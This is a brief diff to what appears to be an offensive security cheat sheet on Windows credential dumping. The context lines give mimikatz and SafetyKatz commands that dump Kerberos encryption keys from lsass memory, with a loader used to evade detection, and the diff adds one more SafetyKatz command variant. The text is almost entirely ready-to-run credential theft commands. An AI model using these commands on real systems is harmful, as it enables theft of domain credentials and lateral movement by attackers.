@@ -10,6 +10,7 @@ mimikatz.exe -Command '"sekurlsa::ekeys"'
 Using SafetyKatz (Minidump of lsass and PELoader to run mimikatz)
 ```powershell
 Loader.exe SafetyKatz.exe "sekurlsa::ekeys"
+Loader.exe SafetyKatz.exe "sekurlsa::evasive-keys"
 ```
 
 ### OverPass-The-Hash
